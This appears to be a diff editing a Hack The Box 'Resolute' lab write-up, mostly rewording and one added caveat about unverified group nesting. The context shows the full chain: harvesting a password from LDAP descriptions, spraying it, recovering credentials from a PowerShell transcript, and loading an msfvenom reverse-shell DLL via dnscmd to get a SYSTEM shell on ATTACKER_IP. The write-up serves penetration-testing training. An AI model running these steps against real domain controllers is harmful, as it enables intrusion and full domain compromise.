@@ -47,7 +47,7 @@ Resolute is a Medium-rated Hack The Box Windows Active Directory lab on a Server
 - **Target:** a Windows Server 2019 domain controller hosting Active Directory for the `<DOMAIN>` domain; standard AD services plus WinRM (5985) and DNS (53).
 - **Starting position:** unauthenticated network access, with no provided credentials.
 - **Objective:** move from anonymous SMB/LDAP enumeration to SYSTEM on the domain controller by combining exposed credentials, a stored session artifact, and an over-privileged group.
-- **Constraints:** activity was confined to the Hack The Box lab environment.
+- **Constraints:** activity stayed inside the Hack The Box lab environment.
 
 ## Evidence: LDAP leak to transcript to DNS plugin
 
@@ -68,13 +68,13 @@ user:[<PROVISION_ACCOUNT>]
   Account: <PROVISION_ACCOUNT>   Name: <PROVISION_NAME>   Desc: Account created. Password set to <DEFAULT_PASSWORD>
 ```
 
-Significance: the `description` (and `info`) attribute is readable by any account that can enumerate the directory — here without authentication — so a documented onboarding password becomes a candidate credential for every account provisioned the same way.
+Significance: the `description` (and `info`) attribute is readable by any account that can enumerate the directory, here without authentication, so a documented onboarding password becomes a candidate credential for every account provisioned the same way.
 
 Result: an initial onboarding password is exposed for `<PROVISION_ACCOUNT>`.
 
 ### 2. Password Spraying
 
-Observation: the leaked default can be tried across the full set of enumerated domain accounts, because accounts sharing the provisioning pattern may never have changed it.
+Observation: I tried the leaked default across the full set of enumerated domain accounts, because accounts sharing the provisioning pattern may never have changed it.
 
 Action:
 
@@ -89,7 +89,7 @@ Truncated output:
 [+] <DOMAIN>\<USER_2>:<DEFAULT_PASSWORD>
 ```
 
-Significance: this is horizontal credential reuse rather than a password-strength attack — one provisioned default is matched against many accounts, and a single hit yields valid domain credentials.
+Significance: this is horizontal credential reuse rather than a password-strength attack: one provisioned default is matched against many accounts, and a single hit yields valid domain credentials.
 
 Result: `<USER_2>` retained the default onboarding password, and authentication succeeds, giving an authenticated foothold.
 
@@ -157,7 +157,7 @@ Truncated output:
 
 Significance: interactive PowerShell transcription logs each command line verbatim, so a credential passed as an argument to `net use` is stored in cleartext on disk; the subsequent SMB authentication confirms the credential and shows the account holds administrative rights.
 
-Result: `<USER_3>`'s password is recovered from the transcript and, once validated through SMB, provides administrative access.
+Result: the transcript exposes `<USER_3>`'s password, which once validated through SMB provides administrative access.
 
 ### 5. BloodHound Group Mapping
 
@@ -169,7 +169,7 @@ Action:
 bloodhound-ce-python -d <DOMAIN> -u '<USER_3>' -p '<USER_3_PASSWORD>' -c all -ns <TARGET_IP>
 ```
 
-The source records that `<USER_3>` is a member of `CONTRACTORS`, which is nested into `DNSADMINS`.
+The source records that `<USER_3>` is a member of `CONTRACTORS`, which is nested into `DNSADMINS`; I could not verify the nesting from captured output.
 
 Significance: the account inherits DNS administration rights through group nesting rather than through any explicit grant on the account, and that group holds a documented privilege-escalation capability.
 
@@ -179,14 +179,14 @@ Result: the account follows a group path that reaches the DNS administration pri
 
 Observation: the `DNSAdmins` group can point the DNS service at a server-level plugin DLL that the service loads on restart, and the DNS service runs as `NT AUTHORITY\SYSTEM`, so any loaded DLL executes at SYSTEM privilege.
 
-Action — generate the DLL and host it on an SMB share:
+Action: generate the DLL and host it on an SMB share:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o <PAYLOAD_DLL>
 sudo impacket-smbserver share . -smb2support
 ```
 
-Action — as `<USER_3>` over WinRM, register the plugin path and restart the service:
+Action: as `<USER_3>` over WinRM, register the plugin path and restart the service:
 
 ```cmd
 dnscmd localhost /config /serverlevelplugindll \\<ATTACKER_IP>\share\<PAYLOAD_DLL>
@@ -194,7 +194,7 @@ sc.exe stop dns
 sc.exe start dns
 ```
 
-Action — catch the callback:
+Action: catch the callback:
 
 ```bash
 nc -lvnp <PORT>
@@ -209,7 +209,7 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-Significance: `dnscmd` lets a `DNSAdmins` member register a plugin DLL that a SYSTEM service loads from a UNC path, so group membership becomes arbitrary code execution as SYSTEM once the service restarts — a documented design capability, not a memory-corruption exploit.
+Significance: `dnscmd` lets a `DNSAdmins` member register a plugin DLL that a SYSTEM service loads from a UNC path, so group membership becomes arbitrary code execution as SYSTEM once the service restarts: a documented design capability, not a memory-corruption exploit.
 
 Result: the callback returns and `whoami` confirms `nt authority\system`, establishing SYSTEM-level command execution on the domain controller.
 
